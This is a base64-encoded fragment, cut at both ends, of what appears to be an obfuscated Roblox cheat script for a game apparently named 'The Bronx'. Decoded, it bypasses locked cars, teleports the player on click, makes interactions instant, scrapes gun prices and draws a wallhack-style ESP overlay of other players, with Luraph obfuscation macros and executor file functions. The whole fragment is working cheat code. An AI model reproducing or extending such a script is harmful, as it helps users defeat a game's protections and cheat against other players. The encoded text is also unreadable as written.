llck1vZGlmaWNhdGlvbnMuRmFzdFJlc3Bhd24gdGhlbiByZXR1cm4gZW5kCiAgICAgICAgICAgICAgICBpZiBub3QgTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyIHRoZW4gcmV0dXJuIGVuZAogICAgICAgICAgICAgICAgRmlyZVNlcnZlcihSZXBsaWNhdGVkU3RvcmFnZS5Mb2FkQ2hhcmFjdGVyKQogICAgICAgICAgICAgICAgCgogICAgICAgICAgICAgICAgU3RhcnRlckd1aTpTZXRDb3JlR3VpRW5hYmxlZChFbnVtLkNvcmVHdWlUeXBlLkJhY2twYWNrLCB0cnVlKQogICAgICAgICAgICBlbmQpKSAgICAgICAgIAoKICAgICAgICAgICAgUHJveGltaXR5UHJvbXB0U2VydmljZS5Qcm9tcHRCdXR0b25Ib2xkQmVnYW46Q29ubmVjdChmdW5jdGlvbihQcm9tcHQsIFNlbGYpCiAgICAgICAgICAgICAgICBpZiBQcm9tcHQgYW5kIFNlbGYgPT0gTG9jYWxQbGF5ZXIgYW5kIGZpcmVwcm94aW1pdHlwcm9tcHQgdGhlbgogICAgICAgICAgICAgICAgICAgIGlmIENvbmZpZy5UaGVCcm9ueC5QbGF5ZXJNb2RpZmljYXRpb25zLkluc3RhbnRJbnRlcmFjdCB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIGZpcmVwcm94aW1pdHlwcm9tcHQoUHJvbXB0LCB0cnVlKQogICAgICAgICAgICAgICAgICAgIGVuZAoKICAgICAgICAgICAgICAgICAgICBpZiBDb25maWcuVGhlQnJvbnguUGxheWVyTW9kaWZpY2F0aW9ucy5CeXBhc3NMb2NrZWRDYXJzIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgaWYgU2VsZiA9PSBMb2NhbFBsYXllciB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB3aGlsZSB0cnVlIGRvCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgUHJvbXB0LlBhcmVudDpGaW5kRmlyc3RDaGlsZCgiRHJpdmVTZWF0IikgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBQcm9tcHQ6SXNBKCJWZWhpY2xlU2VhdCIpIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFByb21wdDpTaXQoTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBQcm9tcHQgPSBQcm9tcHQuUGFyZW50CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFByb21wdCA9IFByb21wdC5QYXJlbnQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBub3QgUHJvbXB0LlBhcmVudCB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBlbmQgCiAgICAgICAgICAgIGVuZCkKCiAgICAgICAgICAgIGxvY2FsIFRlbGVwb3J0X0RlYm91bmNlID0gZmFsc2UKICAgICAgICAgICAgVXNlcklucHV0U2VydmljZS5JbnB1dEJlZ2FuOkNvbm5lY3QoTFBIX05PX1ZJUlRVQUxJWkUoZnVuY3Rpb24oSW5wdXQsIEdhbWVfRXZlbnQpCiAgICAgICAgICAgICAgICBpZiBub3QgbGlicmFyeSB0aGVuIHJldHVybiBlbmQKICAgICAgICAgICAgICAgIGlmIG5vdCBsaWJyYXJ5LmZsYWdzIHRoZW4gcmV0dXJuIGVuZAogICAgICAgICAgICAgICAgaWYgR2FtZV9FdmVudCB0aGVuIHJldHVybiBlbmQKICAgICAgICAgICAgICAgIGlmIElucHV0LlVzZXJJbnB1dFR5cGUgPT0gRW51bS5Vc2VySW5wdXRUeXBlLk1vdXNlQnV0dG9uMSBhbmQgbGlicmFyeS5mbGFnc1siQ2xpY2tUZWxlcG9ydF9UaGVCcm9ueCJdIGFuZCBDb25maWcuVGhlQnJvbnguQ2xpY2tUZWxlcG9ydEFjdGl2ZSB0aGVuCiAgICAgICAgICAgICAgICAgICAgbG9jYWwgTW91c2VMb2NhdGlvbiA9IFVzZXJJbnB1dFNlcnZpY2U6R2V0TW91c2VMb2NhdGlvbigpCiAgICAgICAgICAgICAgICAgICAgbG9jYWwgUmF5ID0gQ2FtZXJhOlZpZXdwb3J0UG9pbnRUb1JheShNb3VzZUxvY2F0aW9uLlgsIE1vdXNlTG9jYXRpb24uWSkKICAgICAgICAgICAgICAgICAgICBsb2NhbCBSYXljYXN0UGFyYW1zID0gUmF5Y2FzdFBhcmFtcy5uZXcoKQogICAgICAgICAgICAgICAgICAgIFJheWNhc3RQYXJhbXMuRmlsdGVyVHlwZSA9IEVudW0uUmF5Y2FzdEZpbHRlclR5cGUuQmxhY2tsaXN0CiAgICAgICAgICAgICAgICAgICAgUmF5Y2FzdFBhcmFtcy5GaWx0ZXJEZXNjZW5kYW50c0luc3RhbmNlcyA9IHtMb2NhbFBsYXllci5DaGFyYWN0ZXIsIFdvcmtzcGFjZTpGaW5kRmlyc3RDaGlsZCgiQ2FtZXJhcyIpLCBXb3Jrc3BhY2U6RmluZEZpcnN0Q2hpbGQoIkNhbWVyYUxvY2F0aW9ucyIpfQogICAgICAgICAgICAgICAgICAgIGxvY2FsIENhc3QgPSBXb3Jrc3BhY2U6UmF5Y2FzdChSYXkuT3JpZ2luLCBSYXkuRGlyZWN0aW9uICogMTAwMCwgUmF5Y2FzdFBhcmFtcykKICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICBpZiBDYXN0IGFuZCBub3QgVGVsZXBvcnRfRGVib3VuY2UgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICBUZWxlcG9ydF9EZWJvdW5jZSA9IHRydWUKCiAgICAgICAgICAgICAgICAgICAgICAgIFRlbGVwb3J0KENGcmFtZS5uZXcoQ2FzdC5Qb3NpdGlvbiArIFZlY3RvcjMubmV3KDAsMywwKSkpCgogICAgICAgICAgICAgICAgICAgICAgICBUZWxlcG9ydF9EZWJvdW5jZSA9IGZhbHNlCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZW5kKSkKCiAgICAgICAgICAgIGlmIFdvcmtzcGFjZTpGaW5kRmlyc3RDaGlsZCgiR1VOUyIpIHRoZW4KICAgICAgICAgICAgICAgIGZvciBJbmRleCwgVmFsdWUgaW4gV29ya3NwYWNlOkZpbmRGaXJzdENoaWxkKCJHVU5TIik6R2V0Q2hpbGRyZW4oKSBkbwogICAgICAgICAgICAgICAgICAgIGlmIG5vdCBWYWx1ZTpJc0EoIk1vZGVsIikgdGhlbiBjb250aW51ZSBlbmQ7CiAgICAgICAgICAgICAgICAgICAgbG9jYWwgUHJpY2UgPSBWYWx1ZTpGaW5kRmlyc3RDaGlsZCgiUHJpY2UiLCB0cnVlKS5WYWx1ZTsKICAgICAgICAgICAgICAgICAgICBpZiBQcmljZSA9PSAwIHRoZW4gY29udGludWUgZW5kOwogICAgICAgICAgICAgICAgICAgIGlmIFByaWNlID4gMTAwMDAwIHRoZW4gY29udGludWUgZW5kOwogICAgICAgICAgICAgICAgICAgIGlmIFByaWNlIDwgMTAgdGhlbiBjb250aW51ZSBlbmQ7CiAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgaWYgbm90IHRhYmxlLmZpbmQoQ29uZmlnLkd1bnMsIFZhbHVlLk5hbWUuLiIgLSAkIi4udG9zdHJpbmcoUHJpY2UpKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIHRhYmxlLmluc2VydChDb25maWcuR3VucywgVmFsdWUuTmFtZS4uIiAtICQiLi50b3N0cmluZyhQcmljZSkpOwogICAgICAgICAgICAgICAgICAgIGVuZDsKICAgICAgICAgICAgICAgIGVuZDsKICAgICAgICAgICAgZW5kOwoKICAgICAgICAgICAgdGFibGUuc29ydChDb25maWcuR3VucywgTFBIX05PX1ZJUlRVQUxJWkUoZnVuY3Rpb24oYSxiKQogICAgICAgICAgICAgICAgcmV0dXJuIGE8YgogICAgICAgICAgICBlbmQpKTsKICAgICAgICBlbmQKICAgIGVuZCkoKQplbmQKCmxvY2FsIEZvbnRzID0ge307IGRvCiAgICBsb2NhbCBmdW5jdGlvbiBSZWdpc3RlckZvbnQoTmFtZSwgV2VpZ2h0LCBTdHlsZSwgQXNzZXQpCiAgICAgICAgaWYgaXNmaWxlKGxpYnJhcnkuZGlyZWN0b3J5Li4iL2Fzc2V0cy8iLi5Bc3NldC5JZCkgdGhlbgogICAgICAgICAgICBkZWxmaWxlKGxpYnJhcnkuZGlyZWN0b3J5Li4iL2Fzc2V0cy8iLi5Bc3NldC5JZCkKICAgICAgICBlbmQKCiAgICAgICAgd3JpdGVmaWxlKGxpYnJhcnkuZGlyZWN0b3J5Li4iL2Fzc2V0cy8iLi5Bc3NldC5JZCwgQXNzZXQuRm9udCkKCiAgICAgICAgbG9jYWwgRGF0YSA9IHsKICAgICAgICAgICAgbmFtZSA9IE5hbWUsCiAgICAgICAgICAgIGZhY2VzID0gewogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgIE5hbWUgPSAiTm9ybWFsIiwKICAgICAgICAgICAgICAgICAgICB3ZWlnaHQgPSBXZWlnaHQsCiAgICAgICAgICAgICAgICAgICAgc3R5bGUgPSBTdHlsZSwKICAgICAgICAgICAgICAgICAgICBhc3NldElkID0gZ2V0Y3VzdG9tYXNzZXQobGlicmFyeS5kaXJlY3RvcnkuLiIvYXNzZXRzLyIuLkFzc2V0LklkKSwKICAgICAgICAgICAgICAgIH0sCiAgICAgICAgICAgIH0sCiAgICAgICAgfQoKICAgICAgICB3cml0ZWZpbGUobGlicmFyeS5kaXJlY3RvcnkuLiIvZm9udHMvIi4uTmFtZSAuLiAiLmZvbnQiLCBTZXJ2aWNlcy5IdHRwU2VydmljZTpKU09ORW5jb2RlKERhdGEpKQoKICAgICAgICByZXR1cm4gZ2V0Y3VzdG9tYXNzZXQobGlicmFyeS5kaXJlY3RvcnkuLiIvZm9udHMvIi4uTmFtZSAuLiAiLmZvbnQiKTsKICAgIGVuZAogICAgCiAgICBsb2NhbCBUYWhvbWEgPSBSZWdpc3RlckZvbnQoIlRhaG9tYSIsIDQwMCwgIk5vcm1hbCIsIHsKICAgICAgICBJZCA9ICJUYWhvbWEudHRmIiwKICAgICAgICBGb250ID0gZ2FtZTpIdHRwR2V0KCJodHRwczovL2dpdGh1Yi5jb20vS2luZ1Zvbk9CbG9ja0pveWNlL09jdG9Ib29rLVVJL3Jhdy9yZWZzL2hlYWRzL21haW4vZnMtdGFob21hLThweCUyMCgzKS50dGYiKSwKICAgIH0pCgogICAgbG9jYWwgUGl4ZWwgPSBSZWdpc3RlckZvbnQoIlBpeGVsIiwgNDAwLCAiTm9ybWFsIiwgewogICAgICAgIElkID0gIlBpeGVsLnR0ZiIsCiAgICAgICAgRm9udCA9IGdhbWU6SHR0cEdldCgiaHR0cHM6Ly9naXRodWIuY29tL0tpbmdWb25PQmxvY2tKb3ljZS92YWRlcnBhc3RlLmx1YXUvcmF3L3JlZnMvaGVhZHMvbWFpbi9QaXhlbC50dGYiKSwKICAgIH0pCgogICAgbG9jYWwgTWluZWNyYWZ0aWEgPSBSZWdpc3RlckZvbnQoIk1pbmVjcmFmdGlhIiwgNDAwLCAiTm9ybWFsIiwgewogICAgICAgIElkID0gIk1pbmVjcmFmdGlhLnR0ZiIsCiAgICAgICAgRm9udCA9IGdhbWU6SHR0cEdldCgiaHR0cHM6Ly9naXRodWIuY29tL2k3N2xobS9zdG9yYWdlL3Jhdy9yZWZzL2hlYWRzL21haW4vZm9udHMvTWluZWNyYWZ0aWEtUmVndWxhci50dGYiKSwKICAgIH0pIAoKICAgIGxvY2FsIFZlcmRhbmEgPSBSZWdpc3RlckZvbnQoIlZlcmRhbmEiLCA0MDAsICJOb3JtYWwiLCB7CiAgICAgICAgSWQgPSAiVmVyZGFuYS50dGYiLAogICAgICAgIEZvbnQgPSBnYW1lOkh0dHBHZXQoImh0dHBzOi8vZ2l0aHViLmNvbS9pNzdsaG0vc3RvcmFnZS9yYXcvcmVmcy9oZWFkcy9tYWluL2ZvbnRzL1ZlcmRhbmEtRm9udC50dGYiKSwKICAgIH0pCgogICAgRm9udHNbIlBsZXgiXSA9IEZvbnQubmV3KFRhaG9tYSwgRW51bS5Gb250V2VpZ2h0LlJlZ3VsYXIsIEVudW0uRm9udFN0eWxlLk5vcm1hbCk7CiAgICBGb250c1siUGl4ZWwiXSA9IEZvbnQubmV3KFBpeGVsLCBFbnVtLkZvbnRXZWlnaHQuUmVndWxhciwgRW51bS5Gb250U3R5bGUuTm9ybWFsKTsKICAgIEZvbnRzWyJNaW5lY3JhZnRpYSJdID0gRm9udC5uZXcoTWluZWNyYWZ0aWEsIEVudW0uRm9udFdlaWdodC5SZWd1bGFyLCBFbnVtLkZvbnRTdHlsZS5Ob3JtYWwpOwogICAgRm9udHNbIlZlcmRhbmEiXSA9IEZvbnQubmV3KFZlcmRhbmEsIEVudW0uRm9udFdlaWdodC5SZWd1bGFyLCBFbnVtLkZvbnRTdHlsZS5Ob3JtYWwpOwplbmQKCmxvY2FsIFBsYXllcnNfRVNQID0ge30KCmxvY2FsIFJlZnJlc2hBbGxFbGVtZW50cyA9IExQSF9OT19WSVJUVUFMSVpFKGZ1bmN0aW9uKCkKICAgIGZvciBpLHYgaW4gUGxheWVyc19FU1AgZG8KICAgICAgICBpZiB2IGFuZCB2LlJlZnJlc2hFbGVtZW50cyB0aGVuCiAgICAgICAgICAgIHYuUmVmcmVzaEVsZW1lbnRzKCkKICAgICAgICBlbmQKICAgIGVuZCAKZW5kKQoKZG8KICAgIGxvY2FsIFdvcmtzcGFjZSwgUnVuU2VydmljZSwgUGxheWVycywgQ29yZUd1aSA9IFNlcnZpY2VzLldvcmtzcGFjZSwgU2VydmljZXMuUnVuU2VydmljZSwgU2VydmljZXMuUGxheWVycywgU2VydmljZXMuQ29yZUd1aQoKICAgIC0tIERlZiAmIFZhcnMKICAgIGxvY2FsIEV1cGhvcmlhID0gQ29uZmlnLkVTUC5Db25uZWN0aW9uczsKICAgIGxvY2FsIGxwbGF5ZXIgPSBQbGF5ZXJzLkxvY2FsUGxheWVyOwogICAgbG9jYWwgQ2FtID0gV29ya3NwYWNlLkN1cnJlbnRDYW1lcmE7CiAgICBsb2NhbCBSb3RhdGlvbkFuZ2xlLCBUaWNrID0gLTQ1LCB0aWNrKCk7CgogICAgbG9jYWwgRnVuY3Rpb25zID0ge30KICAgIGRvCiAgICAgICAgZnVuY3Rpb24gRnVuY3Rpb25zOkNyZWF0ZShDbGFzcywgUHJvcGVydGllcykKICAgICAgICAgICAgbG9jYWwgX0luc3RhbmNlID0gdHlwZW9mKENsYXNzKSA9PSAnc3RyaW5nJyBhbmQgSW5zdGFuY2UubmV3KENsYXNzKSBvciBDbGFzcwogICAgICAgICAgICBmb3IgUHJvcGVydHksIFZhbHVlIGluIHBhaXJzKFByb3BlcnRpZXMpIGRvCiAgICAgICAgICAgICAgICBfSW5zdGFuY2VbUHJvcGVydHldID0gVmFsdWUKICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIHJldHVybiBfSW5zdGFuY2U7CiAgICAgICAgZW5kCiAgICAgICAgLS0KICAgICAgICBGdW5jdGlvbnMuRmFkZU91dE9uRGlzdCA9IExQSF9OT19WSVJUVUFMSVpFKGZ1bmN0aW9uKGVsZW1lbnQsIGRpc3RhbmNlKQogICAgICAgICAgICBsb2NhbCB0cmFuc3BhcmVuY3kgPSBtYXRoLm1heCgwLjEsIDEgLSAoZGlzdGFuY2UgLyBDb25maWcuRVNQLk1heERpc3RhbmNlKSkKICAgICAgICAgICAgaWYgZWxlbWVudDpJc0EoIlRleHRMYWJlbCIpIHRoZW4KICAgICAgICAgICAgICAgIGVsZW1lbnQuVGV4dFRyYW5zcGFyZW5jeSA9IDEgLSB0cmFuc3BhcmVuY3kKICAgICAgICAgICAgZWxzZWlmIGVsZW1lbnQ6SXNBKCJJbWFnZUxhYmVsIikgdGhlbgogICAgICAgICAgICAgICAgZWxlbWVudC5JbWFnZVRyYW5zcGFyZW5jeSA9IDEgLSB0cmFuc3BhcmVuY3kKICAgICAgICAgICAgZWxzZWlmIGVsZW1lbnQ6SXNBKCJVSVN0cm9rZSIpIHRoZW4KICAgICAgICAgICAgICAgIGVsZW1lbnQuVHJhbnNwYXJlbmN5ID0gMSAtIHRyYW5zcGFyZW5jeQogICAgICAgICAgICBlbHNlaWYgZWxlbWVudDpJc0EoIkZyYW1lIikgYW5kIChlbGVtZW50ID09IEhlYWx0aGJhciBvciBlbGVtZW50ID09IEJlaGluZEhlYWx0aGJhcikgdGhlbgogICAgICAgICAgICAgICAgZWxlbWVudC5CYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMSAtIHRyYW5zcGFyZW5jeQogICAgICAgICAgICBlbHNlaWYgZWxlbWVudDpJc0EoIkZyYW1lIikgdGhlbgogICAgICAgICAgICAgICAgZWxlbWVudC5CYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMSAtIHRyYW5zcGFyZW5jeQogICAgICAgICAgICBlbHNlaWYgZWxlbWVudDpJc0EoIkhpZ2hsaWdodCIpIHRoZW4KICAgICAgICAgICAgICAgIGVsZW1lbnQuRmlsbFRyYW5zcGFyZW5jeSA9IDEgLSB0cmFuc3BhcmVuY3kKICAgICAgICAgICAgICAgIGVsZW1lbnQuT3V0bGluZVRyYW5zcGFyZW5jeSA9IDEgLSB0cmFuc3BhcmVuY3kKICAgICAgICAgICAgZW5kOwogICAgICAgIGVuZCk7ICAKCiAgICAgICAgRnVuY3Rpb25zLkFkZE91dGxpbmUgPSBMUEhfTk9fVklSVFVBTElaRShmdW5jdGlvbihGcmFtZSwgVGhpY2tuZXNzKSAgICAgCiAgICAgICAgICAgIEZ1bmN0aW9uczpDcmVhdGUoIkZyYW1lIiwgewogICAgICAgICAgICAgICAgUGFyZW50ID0gRnJhbWUsCiAgICAgICAgICAgICAgICBCb3JkZXJTaXplUGl4ZWwgPSAwLAogICAgICAgICAgICAgICAgQmFja2dyb3VuZENvbG9yMyA9IENvbG9yMy5uZXcoMCwgMCwgMCksCiAgICAgICAgICAgICAgICBQb3NpdGlvbiA9IFVEaW0yLm5ldygwLCAtVGhpY2tuZXNzLCAwLCAtVGhpY2tuZXNzKSwKICAgICAgICAgICAgICAgIFNpemUgPSBVRGltMi5uZXcoMSwgVGhpY2tuZXNzICogMiwgMCwgVGhpY2tuZXNzKSwKICAgICAgICAgICAgICAgIFpJbmRleCA9IEZyYW1lLlpJbmRleCAtIDEKICAgICAgICAgICAgfSkKICAgICAgICAKICAgICAgICAgICAgRnVuY3Rpb25zOkNyZWF0ZSgiRnJhbWUiLCB7CiAgICAgICAgICAgICAgICBQYXJlbnQgPSBGcmFtZSwKICAgICAgICAgICAgICAgIEJvcmRlclNpemVQaXhlbCA9IDAsCiAgICAgICAgICAgICAgICBCYWNrZ3JvdW5kQ29sb3IzID0gQ29sb3IzLm5ldygwLCAwLCAwKSwKICAgICAgICAgICAgICAgIFBvc2l0aW9uID0gVURpbTIubmV3KDAsIC1UaGlja25lc3MsIDEsIDApLAogICAgICAgICAgICAgICAgU2l6ZSA9IFVEaW0yLm5ldygxLCBUaGlja25lc3MgKiAyLCAwLCBUaGlja25lc3MpLAogICAgICAgICAgICAgICAgWkluZGV4ID0gRnJhbWUuWkluZGV4IC0gMQogICAgICAgICAgICB9KQogICAgICAgIAogICAgICAgICAgICBGdW5jdGlvbnM6Q3JlYXRlKCJGcmFtZSIsIHsKICAgICAgICAgICAgICAgIFBhcmVudCA9IEZyYW1lLAogICAgICAgICAgICAgICAgQm9yZGVyU2l6ZVBpeGVsID0gMCwKCiAgICAgICAgICAgICAgICBCYWNrZ3JvdW5kQ29sb3IzID0gQ29sb3IzLm5ldygwLCAwLCAwKSwKICAgICAgICAgICAgICAgIFBvc2l0aW9uID0gVURpbTIubmV3KDAsIC1UaGlja25lc3MsIDAsIDApLAogICAgICAgICAgICAgICAgU2l6ZSA9IFVEaW0yLm5ldygwLCBUaGlja25lc3MsIDEsIDApLAogICAgICAgICAgICAgICAgWkluZGV4ID0gRnJhbWUuWkluZGV4IC0gMQogICAgICAgICAgICB9KQogICAgICAgIAogICAgICAgICAgICBGdW5jdGlvbnM6Q3JlYXRlKCJGcmFtZSIsIHsKICAgICAgICAgICAgICAgIFBhcmVudCA9IEZyYW1lLAogICAgICAgICAgICAgICAgQm9yZGVyU2l6ZVBpeGVsID0gMCwKCiAgICAgICAgICAgICAgICBCYWNrZ3JvdW5kQ29sb3IzID0gQ29sb3IzLm5ldygwLCAwLCAwKSwKICAgICAgICAgICAgICAgIFBvc2l0aW9uID0gVURpbTIubmV3KDEsIDAsIDAsIDApLAogICAgICAgICAgICAgICAgU2l6ZSA9IFVEaW0yLm5ldygwLCBUaGlja25lc3MsIDEsIDApLAogICAgICAgICAgICAgICAgWkluZGV4ID0gRnJhbWUuWkluZGV4IC0gMQogICAgICAgICAgICB9KQogICAgICAgIGVuZCkKICAgIGVuZDsKCiAgICBkbyAtLSBJbml0YWxpemUKICAgICAgICBsb2NhbCBTY3JlZW5HdWkgPSBGdW5jdGlvbnM6Q3JlYXRlKCJTY3JlZW5HdWkiLCB7CiAgICAgICAgICAgIFBhcmVudCA9IENvcmVHdWksCiAgICAgICAgICAgIE5hbWUgPSAiRVNQSG9sZGVyIiwKICAgICAgICAgICAgUmVzZXRPblNwYXduID0gZmFsc2UsCiAgICAgICAgfSk7CgogICAgICAgIGxvY2FsIER1cGVDaGVjayA9IExQSF9OT19WSVJUVUFMSVpFKGZ1bmN0aW9uKHBscikKICAgICAgICAgICAgaWYgU2NyZWVuR3VpOkZpbmRGaXJzdENoaWxkKHBsci5OYW1lKSB0aGVuCiAgICAgICAgICAgICAgICBTY3JlZW5HdWlbcGxyLk5hbWVdOkRlc3Ryb3koKQogICAgICAgICAgICBlbmQKICAgICAgICBlbmQpCgogICAgICAgIGxvY2FsIGdldEhlYWx0aENvbG9yID0gTFBIX05PX1ZJUlRVQUxJWkUoZnVuY3Rpb24oY3VycmVudEhlYWx0aCwgbWF4SGVhbHRoKSAgICAKICAgICAgICAgICAgcmV0dXJuIENvbmZpZy5FU1AuRHJhd2luZy5IZWFsdGhiYXIuR3JhZGllbnRSR0IxOkxlcnAoQ29uZmlnLkVTUC5EcmF3aW5nLkhlYWx0aGJhci5HcmFkaWVudFJHQjIsIChjdXJyZW50SGVhbHRoIC8gbWF4SGVhbHRoKSkKICAgICAgICBlbmQpCgogICAgICAgIGxvY2FsIEVTUCA9IGZ1bmN0aW9uKHBscikKICAgICAgICAgICAgdGFzay5zcGF3bihMUEhfSklUX01BWChmdW5jdGlvbigpCiAgICAgICAgICAgIGlmIHBsciA9PSBscGxheWVyIHRoZW4gcmV0dXJuIGVuZAoKICAgICAgICAgICAgY29yb3V0aW5lLndyYXAoRHVwZUNoZWNrKShwbHIpCiAgICAgICAgICAgIGxvY2FsIE5hbWUgPSBGdW5jdGlvbnM6Q3JlYXRlKCJUZXh0TGFiZWwiLCB7VmlzaWJsZSA9IGZhbHNlLFBhcmVudCA9IFNjcmVlbkd1aSwgUG9zaXRpb24gPSBVRGltMi5uZXcoMC41LCAwLCAwLCAtMTEpLCBTaXplID0gVURpbTIubmV3KDAsIDEwMCwgMCwgMjApLCBBbmNob3JQb2ludCA9IFZlY3RvcjIubmV3KDAuNSwgMC41KSwgQmFja2dyb3VuZFRyYW5zcGFyZW5jeSA9IDEsIFRleHRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigyNTUsIDI1NSwgMjU1KSwgRm9udCA9IEVudW0uRm9udC5Db2RlLCBUZXh0U2l6ZSA9IENvbmZpZy5FU1AuRm9udFNpemUsIFRleHRTdHJva2VUcmFuc3BhcmVuY3kgPSAwLCBUZXh0U3Ryb2tlQ29sb3IzID0gQ29sb3IzLmZyb21SR0IoMCwgMCwgMCksIFJpY2hUZXh0ID0gdHJ1ZX0pCiAgICAgICAgICAgIGxvY2FsIERpc3RhbmNlID0gRnVuY3Rpb25zOkNyZWF0ZSgiVGV4dExhYmVsIiwge1Zpc2libGUgPSBmYWxzZSxQYXJlbnQgPSBTY3JlZW5HdWksIFBvc2l0aW9uID0gVURpbTIubmV3KDAuNSwgMCwgMCwgMTEpLCBTaXplID0gVURpbTIubmV3KDAsIDEwMCwgMCwgMjApLCBBbmNob3JQb2ludCA9IFZlY3RvcjIubmV3KDAuNSwgMC41KSwgQmFja2dyb3VuZFRyYW5zcGFyZW5jeSA9IDEsIFRleHRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigyNTUsIDI1NSwgMjU1KSwgRm9udCA9IEVudW0uRm9udC5Db2RlLCBUZXh0U2l6ZSA9IENvbmZpZy5FU1AuRm9udFNpemUsIFRleHRTdHJva2VUcmFuc3BhcmVuY3kgPSAwLCBUZXh0U3Ryb2tlQ29sb3IzID0gQ29sb3IzLmZyb21SR0IoMCwgMCwgMCksIFJpY2hUZXh0ID0gdHJ1ZX0pCiAgICAgICAgICAgIGxvY2FsIFdlYXBvbiA9IEZ1bmN0aW9uczpDcmVhdGUoIlRleHRMYWJlbCIsIHtWaXNpYmxlID0gZmFsc2UsUGFyZW50ID0gU2NyZWVuR3VpLCBQb3NpdGlvbiA9IFVEaW0yLm5ldygwLjUsIDAsIDAsIDMxKSwgU2l6ZSA9IFVEaW0yLm5ldygwLCAxMDAsIDAsIDIwKSwgQW5jaG9yUG9pbnQgPSBWZWN0b3IyLm5ldygwLjUsIDAuNSksIEJhY2tncm91bmRUcmFuc3BhcmVuY3kgPSAxLCBUZXh0Q29sb3IzID0gQ29sb3IzLmZyb21SR0IoMjU1LCAyNTUsIDI1NSksIEZvbnQgPSBFbnVtLkZvbnQuQ29kZSwgVGV4dFNpemUgPSBDb25maWcuRVNQLkZvbnRTaXplLCBUZXh0U3Ryb2tlVHJhbnNwYXJlbmN5ID0gMCwgVGV4dFN0cm9rZUNvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDAsIDAsIDApLCBSaWNoVGV4dCA9IHRydWUsIFRleHQgPSAiTm9uZSJ9KQogICAgICAgICAgICBsb2NhbCBCb3ggPSBGdW5jdGlvbnM6Q3JlYXRlKCJGcmFtZSIsIHtQYXJlbnQgPSBTY3JlZW5HdWksIEJhY2tncm91bmRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigwLCAwLCAwKSwgQmFja2dyb3VuZFRyYW5zcGFyZW5jeSA9IDAuNzUsIEJvcmRlclNpemVQaXhlbCA9IDB9KQogICAgICAgICAgICBsb2NhbCBHcmFkaWVudDEgPSBGdW5jdGlvbnM6Q3JlYXRlKCJVSUdyYWRpZW50Iiwge1BhcmVudCA9IEJveCwgRW5hYmxlZCA9IENvbmZpZy5FU1AuRHJhd2luZy5Cb3hlcy5HcmFkaWVudEZpbGwsIENvbG9yID0gQ29sb3JTZXF1ZW5jZS5uZXd7Q29sb3JTZXF1ZW5jZUtleXBvaW50Lm5ldygwLCBDb25maWcuRVNQLkRyYXdpbmcuQm94ZXMuR3JhZGllbnRGaWxsUkdCMSksIENvbG9yU2VxdWVuY2VLZXlwb2ludC5uZXcoMSwgQ29uZmlnLkVTUC5EcmF3aW5nLkJveGVzLkdyYWRpZW50RmlsbFJHQjIpfX0pCiAgICAgICAgICAgIGxvY2FsIE91dGxpbmUgPSBGdW5jdGlvbnM6Q3JlYXRlKCJVSVN0cm9rZSIsIHtQYXJlbnQgPSBCb3gsIEVuYWJsZWQgPSBDb25maWcuRVNQLkRyYXdpbmcuQm94ZXMuR3JhZGllbnQsIFRyYW5zcGFyZW5jeSA9IDAsIENvbG9yID0gQ29sb3IzLmZyb21SR0IoMjU1LCAyNTUsIDI1NSksIExpbmVKb2luTW9kZSA9IEVudW0uTGluZUpvaW5Nb2RlLk1pdGVyfSkKICAgICAgICAgICAgbG9jYWwgR3JhZGllbnQyID0gRnVuY3Rpb25zOkNyZWF0ZSgiVUlHcmFkaWVudCIsIHtQYXJlbnQgPSBPdXRsaW5lLCBFbmFibGVkID0gQ29uZmlnLkVTUC5EcmF3aW5nLkJveGVzLkdyYWRpZW50LCBDb2xvciA9IENvbG9yU2VxdWVuY2UubmV3e0NvbG9yU2VxdWVuY2VLZXlwb2ludC5uZXcoMCwgQ29uZmlnLkVTUC5EcmF3aW5nLkJveGVzLkdyYWRpZW50UkdCMSksIENvbG9yU2VxdWVuY2VLZXlwb2ludC5uZXcoMSwgQ29uZmlnLkVTUC5EcmF3aW5nLkJveGVzLkdyYWRpZW50UkdCMil9fSkKICAgICAgICAgICAgbG9jYWwgSGVhbHRoYmFyID0gRnVuY3Rpb25zOkNyZWF0ZSgiRnJhbWUiLCB7UGFyZW50ID0gU2NyZWVuR3VpLCBCYWNrZ3JvdW5kQ29sb3I